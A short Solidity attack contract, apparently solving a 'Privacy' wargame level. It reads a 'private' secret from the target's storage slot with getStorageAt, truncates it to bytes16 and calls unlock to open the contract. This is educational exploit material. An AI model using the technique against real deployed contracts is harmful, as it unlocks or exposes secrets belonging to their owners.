// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Privacy.sol";

contract PrivacyAttack {
    Privacy private immutable privacy;
    constructor(address _privacy){
        privacy = Privacy(_privacy);
    } 

    /* 
        await web3.eth.getStorageAt(contract.address, 5)
        hit this in console you will get 32 bytes value and then paste it into Attack fn
    */
    function Attack(bytes32 _slot) public {
        /* 
            we are taking 32 bytes in inpue and converting it into 16 bytes because
            slot array is 32 bytes and in then It will return 32 bytes value but in Unlock fn
            It's accepting 16 bytes input so we have to do type conversion
            Implicit and explicit conversions (Solidity Docs) - https://docs.soliditylang.org/en/latest/types.html#conversions-between-elementary-types
        */
        bytes16 key = bytes16(_slot);
        privacy.unlock(key);
    }
}
